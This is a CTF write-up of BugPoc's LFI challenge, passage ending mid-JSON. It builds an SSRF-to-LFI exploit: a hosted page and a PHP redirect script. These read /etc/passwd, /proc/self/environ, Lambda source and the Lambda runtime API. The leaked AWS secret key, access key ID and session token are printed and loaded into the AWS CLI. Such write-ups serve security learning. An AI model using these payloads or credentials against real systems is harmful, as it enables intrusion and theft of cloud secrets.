---
title: BugPoc LFI CTF TASK
date: 2020-10-06T16:55:28+05:30
lastmod: 2020-10-06T16:55:28+05:30
authors:
  - t0m7r00z
tags:
  - web
  - SSRF
  - LFI
  - AWS Cloud
image:
  placement: 3
---

# Introduction

After having the LFI CTF Challenge by BugPoc suggested for me by a friend, I wanted to participate and try solving the task and of course making a detailed writeup about it as usual. Having some bad luck, I just started participating after the start of the CTF task with a delay of 12 hours from what I remember, resulting in not being able to secure a TOP 3 place :frowning:. That being said, let's dig into it!

# TL;DR

1. Host a simple web HTTP server or use an online web hosting service.
2. Create the index page of it and let it have the `meta property="og:image"` set to the URL of your web server pointing to the file that is going to handle requests made by the challenge API ending it with a GET parameter named `.svg` so it's gonna end like `?.svg` to bypass the extension check made by the API.
3. Create that file mentioned above to respond to HEAD requests with the header `Content-Type` set to `image/svg+xml` and respond to GET requests with a redirect to a URL with a protocol being `file://` and a path set to the file you want to read for example `/etc/passwd`

# The Challenge

## Overview

Accessing the website we are provided with a textarea to write some text.

![](visiting_the_page.png)

Making some dynamic analysis and entering some input, it will provide us some buttons to share what we typed on social media.

![](oninput_the_page.png)

Taking a look at the source of this page with a `CTRL + U`, we see the textarea with some event handlers underlined in the picture below.

![](event_handlers_textarea.png)

So to know what an `event handler` is you need to first know what the `DOM` is. The `DOM` or `Document Object Model` is an interface to treat `HTML` or `XML` like documents, notifying the code with the things that are occurring at the moment, making changes to the elements or getting information about them. That being said, `event handlers` are a way to be notified about the `DOM Events`. In this case, it's using the `oninput` event handler, meaning it will call the two functions `auto_grow` and `scanForURL` once we type something in the textarea. `this` keyword here is a reference to the element `textarea` and it's attributes.

Taking a Look at the source code, we notice that these called functions are declared in the externally included JavaScript file `script-min.js`.

![](externally_included_script.png)

Taking a look at it's content to reverse engineer it, we can see that it's not quite readable.

![](not_readable_script.png)

That being said, let's beautify it out using the online service at: https://beautifier.io/

Pasting that spaghetti code and clicking on `Beautify Code` will yield this result:

```js
function scanForURL() {
    text = document.getElementById("text").value, "" == text ? (document.getElementById("twitter-button").style.display = "none", document.getElementById("reddit-button").style.display = "none") : (document.getElementById("twitter-button").style.display = "inline-block", document.getElementById("reddit-button").style.display = "inline-block"), urlRegex = /(https?:\/\/[^\s]+)/g, result = text.match(urlRegex), null != result ? (url = result[0], url != currentUrl && (currentUrl = url, processUrl(url)), document.getElementById("facebook-button").style.display = "inline-block", document.getElementById("linkedin-button").style.display = "inline-block", document.getElementById("pinterest-button").style.display = "inline-block", document.getElementById("tumblr-button").style.display = "inline-block", document.getElementById("flipboard-button").style.display = "inline-block") : (document.getElementById("website-preview").style.display = "none", document.getElementById("facebook-button").style.display = "none", document.getElementById("linkedin-button").style.display = "none", document.getElementById("pinterest-button").style.display = "none", document.getElementById("tumblr-button").style.display = "none", document.getElementById("flipboard-button").style.display = "none")
}

function openShareLink(e) {
    switch (text = document.getElementById("text").value, encodedText = encodeURIComponent(text), urlRegex = /(https?:\/\/[^\s]+)/g, result = text.match(urlRegex), null != result ? url = result[0] : url = "", encodedUrl = encodeURIComponent(url), e) {
        case "facebook":
            popup("https://www.facebook.com/sharer/sharer.php?u=" + encodedUrl + "&quote=" + encodedText);
            break;
        case "twitter":
            popup("https://twitter.com/intent/tweet?url=" + encodedUrl + "&text=" + encodedText);
            break;
        case "reddit":
            popup("http://www.reddit.com/submit?url" + encodedUrl + "&title=" + encodedText);
            break;
        case "pinterest":
            popup("http://pinterest.com/pin/create/button/?url=" + encodedUrl + "&description=" + encodedText);
            break;
        case "flipboard":
            popup("https://share.flipboard.com/bookmarklet/popout?url=" + encodedUrl + "&title=" + encodedText);
            break;
        case "tumblr":
            popup("http://www.tumblr.com/share/link?url=" + encodedUrl + "&name=" + encodedText);
            break;
        case "linkedin":
            popup("https://www.linkedin.com/shareArticle?url=" + encodedUrl + "&summary=" + encodedText)
    }
}

function popup(e) {
    window.open(e, "_blank", "toolbar=no,\n\t\t\t\t\t\t\t\tlocation=no,\n\t\t\t\t\t\t\t\tstatus=no,\n\t\t\t\t\t\t\t\tmenubar=no,\n\t\t\t\t\t\t\t\tscrollbars=yes,\n\t\t\t\t\t\t\t\tresizable=yes,\n\t\t\t\t\t\t\t\twidth=SomeSize,\n\t\t\t\t\t\t\t\theight=SomeSize")
}

function processUrl(e) {
    requestTime = Date.now(), url = "https://api.buggywebsite.com/website-preview";
    var t = new XMLHttpRequest;
    t.onreadystatechange = function() {
        4 == t.readyState && 200 == t.status ? (response = JSON.parse(t.responseText), populateWebsitePreview(response)) : 4 == t.readyState && 200 != t.status && (console.log(t.responseText), document.getElementById("website-preview").style.display = "none")
    }, t.open("POST", url, !0), t.setRequestHeader("Content-Type", "application/json; charset=UTF-8"), t.setRequestHeader("Accept", "application/json"), data = {
        url: e,
        requestTime: requestTime
    }, t.send(JSON.stringify(data))
}

function populateWebsitePreview(e) {
    if (oldLoadTime = parseInt(document.getElementById("website-preview").getAttribute("loadTime")), !(oldLoadTime > e.requestTime) && (null == e.image && (e.image = {
            content: ""
        }), null != e.image)) {
        if (imgData = e.image, null != imgData.error) return void console.log("Image Preview Error: " + imgData.error);
        null == imgData.mimetype ? document.getElementById("website-img").setAttribute("src", "website.png") : imgData.encoded ? document.getElementById("website-img").setAttribute("src", b64toBlobUrl(imgData.content, imgData.mimetype)) : (blob = new Blob([imgData.content], {
            type: imgData.mimetype
        }), document.getElementById("website-img").setAttribute("src", URL.createObjectURL(blob))), maxTitleLength = 50, e.title.length > maxTitleLength ? document.getElementById("website-title").innerText = e.title.substring(0, maxTitleLength) + "..." : document.getElementById("website-title").innerText = e.title, maxDescriptionLength = 100, e.description.length > maxDescriptionLength ? document.getElementById("website-description").innerText = e.description.substring(0, maxDescriptionLength) + "..." : document.getElementById("website-description").innerText = e.description, document.getElementById("website-domain").innerText = e.domain, document.getElementById("website-preview").style.display = "block", document.getElementById("website-preview").setAttribute("loadTime", requestTime)
    }
}

function b64toBlobUrl(e, t = "", n = 512) {
    const o = atob(e),
        l = [];
    for (let e = 0; e < o.length; e += n) {
        const t = o.slice(e, e + n),
            i = new Array(t.length);
        for (let e = 0; e < t.length; e++) i[e] = t.charCodeAt(e);
        const r = new Uint8Array(i);
        l.push(r)
    }
    const i = new Blob(l, {
        type: t
    });
    return URL.createObjectURL(i)
}

function auto_grow(e) {
    e.style.height = "5px", e.style.height = e.scrollHeight + "px"
}
currentUrl = null;
```

Reading some code, we know that the `auto_grow` function with the `textarea` element as an argument is just going to make the textarea larger. We also know that the called function `scanForURL` is going to check for existing URLs in our input, take the first matched URL and call the function `processUrl` with our URL being it's argument, and finally showing all the other buttons. Here is what it looks like:

![](what_url_looks_like.png)

Taking a look at the `processUrl` function we know it's going to make a POST request to this sub-domain's endpoint https://api.buggywebsite.com/website-preview with the data being in JSON format having the two keys: `url` set to our matched URL in the input and the `requestTime` being the timestamp of the current time of the server. Then it's going to parse the returned data from the API as JSON and call the function `populateWebsitePreview` with the returned JSON data being it's argument. The `populateWebsitePreview` function is going to access some of this JSON object keys like the `image, title, domain, description` and show them back to us in that little box in the `textarea`.  Trying to request a website that have some of these things in it, here is an example of what we get:

![](github_example_site.png)

The buttons for the social media share have also some event handlers set but they aren't really important as they just call the function `openShareLink`  which will urlencode the first matched URL in our input and doing that to our input too then passing them as parameters to the social media's websites then opening the generated URLs in a new window.

![](buttons_event_handler.png)

Knowing all this information let's start hunting for the bug.

## Hunting For The Bug

A good thing to do here is to open the `Chrome developer tools`, go to the network tab and take a look at the requests made. For this purpose hit `F12` key or press `CTRL + SHIFT + C` or you can also just right click and click on `Inspect Element`.  After having it opened, go to the `Network` tab above. Then go back to the page and write in `https://www.github.com` and watch the made requests. I just copied pasted the URL and added a `/` at the end so we will just have the essential requests only being made. And it's easy for you to understand and repeat. So taking a look at the requests, we see 3 requests the first one is an OPTIONS request to the sub-domain and the second one is the POST request (it's the one we are interested in) and finally the blob generated URL from the gathered image of the website we entered.

![](first_part_post_request.png)

Scrolling down to take a look at the parameters, we see that it passes the URL it matched and the timestamp of the current time just like we concluded before from the source code.

![](params_from_source.png)

Taking a look at the `Response` tab to know how the return JSON object looks like

![](how_response_looks.png)

It's pretty large and it wouldn't fit the space needed, to show it I would need to make a lot of screenshots here. So let's right click on the request and choose the `Copy` then select `Copy as cURL (bash)` to export the request in the form of a `curl` command in bash, then go to our terminal and start playing with it, because that's more satisfying and it makes the work a bit faster and easy. Our curl request looks like that:

![](curl_looks_like.png)

I just added an echo after it so the output will have a newline character at the end of it and that's because the returned data doesn't do so which might screw the terminal when writing commands a bit. The output of the command containing the JSON object is a bit large so I split it into two screenshots:

![](respone_of_command_1.png)

![](respone_of_command_2.png)

The JSON object contains the keys we mentioned before, what I mostly see important here is the `image ` key having the base64 encoded image as `content`. Before going that way, I played a bit with the passed `url` in our inputted JSON. Trying to make it point to `localhost`, trying some ports with `localhost ` as domain, make a redirect to `localhost`, trying to access `file:///etc/passwd` but nothing really worked here and the `requestTime` key wasn't really important at all. That the response I always got back:

![](error_response_tries.png)

So back into that `image` key trip, what we could conclude from the response there that it made a request to get the image content then base64 encode it and put it in the `content` key of the `image` in the returned JSON object. It seems like it's getting all the info (title, description, image) from the `meta` HTML tags. Here is a screenshot of the meta tags of the Github that contains the info returned in the above screenshot.

![](github_meta_tags.png)

So if we host a little server containing a page with these tags we can change the `og:image` to a URL from our choice and make the API request it. I'm using `ngrok` which is a reverse proxy that creates a secure tunnel from a public endpoint to our local web server so that anyone can access it from the external. You can have it from the official website: https://ngrok.com. Running it with `./ngrok http 80` and it will return a beautiful interface from which you can observe the made requests to your server and the URL to access the server.

![](ngrok_interface.png)

I made a little directory in the `/var/www/html/` called `bounty` to have all the files we are going to create. Now let's start with creating the `index.html` which will contain the meta tags we need. So we will create a meta containing the title, a meta containing the description and a meta containing the image URL. Here is how the file should look like:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta property="og:title" content="t0m7r00z">
<meta property="og:description" content="t0m7r00z">
<meta property="og:image" content="http://080b27197198.ngrok.io/bounty/index.html">
<meta property="og:image:type" content="image/png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="620">
</head>
<body>
t0m7r00z
</body>
</html>
```

Saving that file in the `/var/www/html/bounty/` as `index.html`, and passing this `http://080b27197198.ngrok.io/bounty/index.html` (my ngrok sub-domain is different then yours so change it for the request to work) in `url` key of our JSON sent data. Result:

![](invalid_image_url.png)

`Invalid Image URL` is the error we got back, my guess for that one was that it's wants a valid extension. Having that in mind, we know that making a request to `localhost` or to `file:///etc/passwd` wouldn't really work straight forwardly. Back to the main idea again, in our payload change the meta tag of the image property and add a GET parameter at the end of the URL so it will have no effect from our side but it will bypass the extension check from the server side. the meta tag should look like that now:

```html
<meta property="og:image" content="http://080b27197198.ngrok.io/bounty/index.html?.png">
```

Editing the file and re-executing that curl command, we get a new error. Result:

![](new_error_image.png)

`Image Failed HEAD Test`, what come to my mind when reading that, is it failed checking the file header or file signature to be a valid `PNG`. But When checking the `ngrok` requests log, we can see that it actually made a request of type HEAD to our server.

![](head_request_made.png)

So maybe the HEAD request should return the valid image? Answering that question by making a PHP script in a file named `test.php` and making it return the content of a valid PNG image. This is the PHP file:

```php
<?php
readfile("asdf.png");
?>
```

Changing the meta tag to point to it again:

```html
<meta property="og:image" content="http://080b27197198.ngrok.io/bounty/test.php?.png">
```

And re-executing the curl command will yield this new result:

![](same_error_again.png)

Same error again, then it should be checking for the returned header, right? Adding these lines to the PHP file:

```php
<?php
header("Content-Type: image/png");
header("Content-Length: " . filesize("asdf.png"));
readfile("asdf.png");
?>
```

And re-executing the curl command, and it worked, so it seems like it's just checking for the `Content-Type` header.

![](the_right_one_after.png)

Something got my attention in the `ngrok` requests log, that it made a GET request to the same file `test.php` after making the HEAD request. This is how the LOG looked like:

![](interesting_thing.png)

So I'm assuming from the past errors we got and this requests log, that it's going to make the HEAD request to get the Content-Type header and verify it's valid comparing it to the extension, and then it's going to make the GET request and fetch the data, and finally return it back. That being said, let's make the PHP script respond to the HEAD requests with the `Content-Type` and respond to the GET requests with a redirect to a URL we want, I'm making it http://example.com. Adding those info to the PHP script:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
	header("Content-Type: image/png");
	header("Content-Length: " . filesize("asdf.png"));
	readfile("asdf.png");
}
else {
	header("Location: http://example.com/");
}
?>
```

And re-executing the curl request, will return back:

![](not_least_error.png)

`Unable to Process Image` error, maybe it's trying to process it based on the extension and the mime type returned by `Content-Type` header. The nearest type to text or just random data is `xml+svg`. So let's change `Content-Type` header to `image/xml+svg` and the meta tag of the image property in the `index.html` file making the GET parameter holding the fake extension set to `?.svg`. Both `index.html` and `test.php` should look like that now:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta property="og:title" content="t0m7r00z">
<meta property="og:description" content="t0m7r00z">
<meta property="og:image" content="http://080b27197198.ngrok.io/bounty/test.php?.svg">
<meta property="og:image:type" content="image/xml+svg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="620">
</head>
<body>
t0m7r00z
</body>
</html>
```

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
	header("Content-Type: image/xml+svg");
	header("Content-Length: 1337");
}
else {
	header("Location: http://example.com/");
}
?>
```

Saving the files after making the edits and re-executing the curl command, we have this response now:

![](working_bug.png)

Great! We have an SSRF and we probably could turn that into an LFI. So let's exploit it and try reading the `/etc/passwd` file.

## Exploitation

In order to read the `/etc/passwd` we could try making a redirect to `file:///etc/passwd` as the URL. So changing the `test.php` file, making the `Location` of the redirect `file:///etc/passwd`, being:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
	header("Content-Type: image/xml+svg");
	header("Content-Length: 1337");
}
else {
	header("Location: file:///etc/passwd");
}
?>
```

Saving and re-executing the curl command, and BOOM:

![](the_etc_passwd.png)

We just got the content of the `/etc/passwd` file and we could read any file on the local system as long as we have permissions to.

# Bonus

BugPoc has tweeted about adding a how to leak:

	- the source code of the website
 - cloud metadata

to our writeups. So why not make a detailed about it!

## Leaking The Source Code

First step to do before getting in touch with the source code is knowing where we are and what is the command being run of the current process. For this purpose, we can examine the `/proc/self/cmdline` for the entered command of the current process which might also let us know the current path we are in, and `/proc/self/environ` which will list environment variables of the current process and it might contain some interesting variables that might help us know where could the source code be at. Starting with getting the `/proc/self/cmdline`, we would need to change the redirect URL in our PHP file to `file:///proc/self/cmdline`. After changing it, it should look like that:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
        header("Content-Type: image/xml+svg");
        header("Content-Length: 1337");
}
else {
        header("Location: file:///proc/self/cmdline");
}
?>
```

Just a little note I'm doing this work after a day of writing all the above so my ngrok link will be changed when doing the curl command. After saving the file, we can do the curl again which will respond with the command being executed and it's command line arguments:

![](proc_self_cmdline.png)

Okay good, the `\u0000` is just a null byte so that programs interpreting the command will know where each string or let's say each argument should end meaning the `argv[0]` being the argument number 0 meaning the command name or path which is `/var/lang/bin/python3.8` in this case and then the `argv[1]` being `/var/runtime/bootstrap.py` and so on and so far. In AWS Lambda, there's something called `AWS Lambda runtime` which is a program that runs a Lambda function's handler method when the function is invoked and it can be done in any programming language. In our case it's the `/var/runtime/bootstrap.py` being a python script, reading this file might help in getting the source code location as it is responsible of running it through the lambda function's handler method. Reading it will just require changing the URL in the `Location` of our PHP script to point to `file:///var/runtile/bootstrap.py`.

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
        header("Content-Type: image/xml+svg");
        header("Content-Length: 1337");
}
else {
        header("Location: file:///var/runtime/bootstrap.py");
}
?>
```

Saving and re-executing and it returned the content of the file. It's a bit large to take a screenshot of so I'm not taking all of it and when talking about it I will just paste the important function that we will let us know where is the actual source code at.

![](bootstrap_large.png)

I'm only pasting the main function of the script we just leaked as it contains the important part and we can ignore the rest of it.

```python
def main():
    sys.stdout = Unbuffered(sys.stdout)
    sys.stderr = Unbuffered(sys.stderr)
    os.environ['AWS_EXECUTION_ENV'] = 'AWS_Lambda_python3.8'

    with create_log_sink() as log_sink:
        lambda_runtime_api_addr = os.environ['AWS_LAMBDA_RUNTIME_API']
        lambda_runtime_client = LambdaRuntimeClient(lambda_runtime_api_addr)

        try:
            logging.Formatter.converter = time.gmtime
            logger = logging.getLogger()
            logger_handler = LambdaLoggerHandler(log_sink)
            logger_handler.setFormatter(logging.Formatter(
                '[%(levelname)s]\t%(asctime)s.%(msecs)dZ\t%(aws_request_id)s\t%(message)s\n',
                '%Y-%m-%dT%H:%M:%S'
            ))
            logger_handler.addFilter(LambdaLoggerFilter())
            logger.addHandler(logger_handler)

            global _GLOBAL_AWS_REQUEST_ID

            set_default_sys_path()
            add_default_site_directories()
            set_default_pythonpath()

            handler = os.environ["_HANDLER"]
            request_handler = _get_handler(handler)
        except Exception as e:
            error_result = build_fault_result(sys.exc_info(), None)

            log_error(error_result, log_sink)
            lambda_runtime_client.post_init_error(to_json(error_result))

            sys.exit(1)

        while True:
            event_request = lambda_runtime_client.wait_next_invocation()

            _GLOBAL_AWS_REQUEST_ID = event_request.invoke_id

            update_xray_env_variable(event_request.x_amzn_trace_id)

            handle_event_request(lambda_runtime_client,
                                 request_handler,
                                 event_request.invoke_id,
                                 event_request.event_body,
                                 event_request.content_type,
                                 event_request.client_context,
                                 event_request.cognito_identity,
                                 event_request.invoked_function_arn,
                                 event_request.deadline_time_in_ms,
                                 log_sink)

if __name__ == '__main__':
    main()
```

From reading a bit the manuel of the `AWS Lambda` we know that it the entry function is defined in a handler variable and it's in the format of `filename.handler`. In the source code above, the handler variable is initialized here to the value of the environment variable named `_HANDLER`.

```python
handler = os.environ["_HANDLER"]
```

Time to get the environment variable, as mentioned above they are located at `/proc/self/environ`. As usual getting then will only require changing the `Location` in our PHP file making it `file:///proc/self/environ`.

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
        header("Content-Type: image/xml+svg");
        header("Content-Length: 1337");
}
else {
        header("Location: file:///proc/self/environ");
}
?>
```

Saving and re-executing the curl command, it will return the environment variables of the current process.

![](environment_variables.png)

Not really readable so I will try to provide a better overview of it by making a one line python instruction:

```pyth
print("AWS_LAMBDA_FUNCTION_VERSION=$LATEST\u0000AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELf//////////wEaCXVzLXdlc3QtMiJGMEQCIAG1u0ehADhMMZfoowQaAuwh57FZcLW+ZspdWaeW2lcGAiAQg8PHy5rHp+6RXcGar+jajx0TrD845AbImipgRrsZfCrbAQjg//////////8BEAEaDDAxMDU0NDQzOTIxMCIMOusHDlfYkV+3AHv/Kq8Bav8X9J/CySOEjcCADV0yoZa1TAl9gMpC6soH1JZBKr4fgAmsGEZVS+OUzYqJdc+gPmO+umYYUPQWHH+yOX5fKqMNDTeWF3EqzCDkTq8JIDo9ousg31+eWPEW4CHaGol+zjNU47Duw9y7mwRfP1oW3Kpk5PPWOhsXyyKI8JGnFncKuC7Bv0J/mpUeSbevs6gY4I+NVZ47MWSHcQCwWGS/9cIYh/MuYNxuxKmX1Sw5LDD0ye77BTrhAYk6EHIgiACgYb2+cSmDea8CZTWOXnB2K8EXjIOdwKliMmIeF0xlmAbyAfzCETae8vWr3mZ+3UqEAHHnbG2lrDTO2VzBNvvSD0aevOwmhyt3dvvaHjvK5y+E9HZJKac7pVDxb4gNdEjsf8RtVMlosfy2l9pKMyBEab588Psw29XwcKVQPcOx+JcMHku4opki+Rz0qY6bmRiJ6c4kX39AxTncXcoJ3HmuCkAkfVy5Buh0P/qiT+tUJSBOhLFNMJuFZy6IWZMSRPET+Zf8TJUNNFiTT+aUwo7AlI3EQrMr56Da+g==\u0000AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/get-website-preview\u0000LAMBDA_TASK_ROOT=/var/task\u0000LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\u0000AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001\u0000AWS_LAMBDA_LOG_STREAM_NAME=2020/10/05/[$LATEST]76326842b1c94287ac553f1ad521636c\u0000AWS_EXECUTION_ENV=AWS_Lambda_python3.8\u0000AWS_LAMBDA_FUNCTION_NAME=get-website-preview\u0000AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000\u0000PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\u0000AWS_DEFAULT_REGION=us-west-2\u0000PWD=/var/task\u0000AWS_SECRET_ACCESS_KEY=rf/BLtpoCAbBubLzmve0PljBq8Y2l7PrFL3vG9lR\u0000LAMBDA_RUNTIME_DIR=/var/runtime\u0000LANG=en_US.UTF-8\u0000AWS_REGION=us-west-2\u0000TZ=:UTC\u0000AWS_ACCESS_KEY_ID=ASIAQE5D7L6VP2AJX2F4\u0000SHLVL=0\u0000_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2\u0000_AWS_XRAY_DAEMON_PORT=2000\u0000_LAMBDA_TELEMETRY_LOG_FD=3\u0000AWS_XRAY_CONTEXT_MISSING=LOG_ERROR\u0000_HANDLER=lambda_function.lambda_handler\u0000AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512\u0000".replace("\x00", "\n"))
```

Just replaced the null byte we talked about previously into a newline and printed it out to stdout. Which will return this more readable result:

```AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELf//////////wEaCXVzLXdlc3QtMiJGMEQCIAG1u0ehADhMMZfoowQaAuwh57FZcLW+ZspdWaeW2lcGAiAQg8PHy5rHp+6RXcGar+jajx0TrD845AbImipgRrsZfCrbAQjg//////////8BEAEaDDAxMDU0NDQzOTIxMCIMOusHDlfYkV+3AHv/Kq8Bav8X9J/CySOEjcCADV0yoZa1TAl9gMpC6soH1JZBKr4fgAmsGEZVS+OUzYqJdc+gPmO+umYYUPQWHH+yOX5fKqMNDTeWF3EqzCDkTq8JIDo9ousg31+eWPEW4CHaGol+zjNU47Duw9y7mwRfP1oW3Kpk5PPWOhsXyyKI8JGnFncKuC7Bv0J/mpUeSbevs6gY4I+NVZ47MWSHcQCwWGS/9cIYh/MuYNxuxKmX1Sw5LDD0ye77BTrhAYk6EHIgiACgYb2+cSmDea8CZTWOXnB2K8EXjIOdwKliMmIeF0xlmAbyAfzCETae8vWr3mZ+3UqEAHHnbG2lrDTO2VzBNvvSD0aevOwmhyt3dvvaHjvK5y+E9HZJKac7pVDxb4gNdEjsf8RtVMlosfy2l9pKMyBEab588Psw29XwcKVQPcOx+JcMHku4opki+Rz0qY6bmRiJ6c4kX39AxTncXcoJ3HmuCkAkfVy5Buh0P/qiT+tUJSBOhLFNMJuFZy6IWZMSRPET+Zf8TJUNNFiTT+aUwo7AlI3EQrMr56Da+g==
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/get-website-preview
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_LAMBDA_LOG_STREAM_NAME=2020/10/05/[$LATEST]76326842b1c94287ac553f1ad521636c
AWS_EXECUTION_ENV=AWS_Lambda_python3.8
AWS_LAMBDA_FUNCTION_NAME=get-website-preview
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=us-west-2
PWD=/var/task
AWS_SECRET_ACCESS_KEY=rf/BLtpoCAbBubLzmve0PljBq8Y2l7PrFL3vG9lR
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_REGION=us-west-2
TZ=:UTC
AWS_ACCESS_KEY_ID=ASIAQE5D7L6VP2AJX2F4
SHLVL=0
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
_LAMBDA_TELEMETRY_LOG_FD=3
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=lambda_function.lambda_handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512
```

Before getting the `_HANDLER` variable we already see some interesting variables having the `SecretKey, AccessID, Token` of the AWS. Focusing in getting the source code now and then we will take a look at them. So we can see that  `_HANDLER=lambda_function.lambda_handler` meaning that `lambda_function` is the filename or more the module name having the function `lambda_handler`. That being said, getting the source code means reading the file `lambda_function.py` which should be located at the same directory we are in which we can also know form the environment variables being `PWD=/var/task`. Then source code is located at `/var/task/lambda_function.py`. Trying to read that by changing the URL in `Location` of the PHP script as usual having:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
        header("Content-Type: image/xml+svg");
        header("Content-Length: 1337");
}
else {
        header("Location: file:///var/task/lambda_function.py");
}
?>
```

Saving and re-executing the curl command, we will have the source code of the API we are using now.

![](a_bit_large_source_code_leaked.png)

It's a bit large again, and there is no need to paste it here as we don't need it any further attacks we will perform. Cool!

## Leaking The Cloud MetaData

Looking again into the environment variables above, we have 3 important variables which are:

- `AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELf//////////wEaCXVzLXdlc3QtMiJGMEQCIAG1u0ehADhMMZfoowQaAuwh57FZcLW+ZspdWaeW2lcGAiAQg8PHy5rHp+6RXcGar+jajx0TrD845AbImipgRrsZfCrbAQjg//////////8BEAEaDDAxMDU0NDQzOTIxMCIMOusHDlfYkV+3AHv/Kq8Bav8X9J/CySOEjcCADV0yoZa1TAl9gMpC6soH1JZBKr4fgAmsGEZVS+OUzYqJdc+gPmO+umYYUPQWHH+yOX5fKqMNDTeWF3EqzCDkTq8JIDo9ousg31+eWPEW4CHaGol+zjNU47Duw9y7mwRfP1oW3Kpk5PPWOhsXyyKI8JGnFncKuC7Bv0J/mpUeSbevs6gY4I+NVZ47MWSHcQCwWGS/9cIYh/MuYNxuxKmX1Sw5LDD0ye77BTrhAYk6EHIgiACgYb2+cSmDea8CZTWOXnB2K8EXjIOdwKliMmIeF0xlmAbyAfzCETae8vWr3mZ+3UqEAHHnbG2lrDTO2VzBNvvSD0aevOwmhyt3dvvaHjvK5y+E9HZJKac7pVDxb4gNdEjsf8RtVMlosfy2l9pKMyBEab588Psw29XwcKVQPcOx+JcMHku4opki+Rz0qY6bmRiJ6c4kX39AxTncXcoJ3HmuCkAkfVy5Buh0P/qiT+tUJSBOhLFNMJuFZy6IWZMSRPET+Zf8TJUNNFiTT+aUwo7AlI3EQrMr56Da+g==`
- `AWS_SECRET_ACCESS_KEY=rf/BLtpoCAbBubLzmve0PljBq8Y2l7PrFL3vG9lR`
- `AWS_ACCESS_KEY_ID=ASIAQE5D7L6VP2AJX2F4`

Having these keys and token we can invoke the AWS commands from my local machine using `AWS cli`. We can approach that with 2 different ways:

1. Executing the command `aws configure` and pasting the info like that: ![](pasting_info_aws_config.png)
2. exporting those variables into our current shell session like that: ![](exporting_into_current_session.png)

Good, now we are able to reach the AWS with `AWS cli` locally. Extracting some metadata from the cloud now by executing the command `aws sts get-caller-identity` which will use the `AWS Security Token Service` and fetch the informations we requested and finally return it:

![](some_of_the_metadata.png)

From the environment variables we can see the host and port of the `AWS Lambda Runtime API`  at this line: `AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001`, which is an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment. And it is accessible from within an active invocation of a function, meaning we can access it with the SSRF in this case by providing it's host and port followed by the OpenAPI specification for the runtime API version and then the path to the next invocation. That being said, our URL should look like `http://127.0.0.1:9001/2018-06-01/runtime/invocation/next`, where `2018-06-01` is the OpenAPI version specification for the runtime API version and it's going to be usually the same then `/runtime/invocation/next` is the resource path to `Next Invocation` that will return a response body containing the event data from the function trigger plus some additional data about the invocation. Changing the `Location` in our PHP file as usual yielding to:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] === "HEAD") {
	header("Content-Type: image/xml+svg");
	header("Content-Length: 1337");
}
else {
	header("Location: http://127.0.0.1:9001/2018-06-01/runtime/invocation/next");
}
?>
```

Saving and re-executing our curl command it will return all the data discussed above:

![](invocation_data_aws_lambda.png)

Just hiding my external IP even if I know that it's dynamic and might not be helpful for anything :joy:. Using an online json beautifier to make the result more readable we will have:

```
{
   "resource":"/website-preview",
   "path":"/website-preview",
   "httpMethod":"POST",
   "headers":{
      "Accept":"application/json",
      "Accept-Encoding":"deflate, gzip",
      "Accept-Language":"fr",
      "authority":"api.buggywebsite.com",
      "cache-control":"no-cache",
      "CloudFront-Forwarded-Proto":"https",
      "CloudFront-Is-Desktop-Viewer":"true",
      "CloudFront-Is-Mobile-Viewer":"false",
      "CloudFront-Is-SmartTV-Viewer":"false",
      "CloudFront-Is-Tablet-Viewer":"false",
      "CloudFront-Viewer-Country":"TN",
      "content-type":"application/json; charset=UTF-8",
      "Host":"api.buggywebsite.com",
      "origin":"http://social.buggywebsite.com",
      "pragma":"no-cache",
      "Referer":"http://social.buggywebsite.com/",
      "sec-fetch-dest":"empty",
      "sec-fetch-mode":"cors",
      "sec-fetch-site":"cross-site",
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
      "Via":"2.0 13dcb5d1ef6aaeefea92da59d4323d89.cloudfront.net (CloudFront)",
      "X-Amz-Cf-Id":"Cb5d5Va22R85w7rrHeZ7khQ3n_vBK8IuRFrktUnRTyab_ZVqSviVpQ==",
      "X-Amzn-Trace-Id":"Root=1-5f7c3a93-6ed3d32b2cf2f039039e4967",
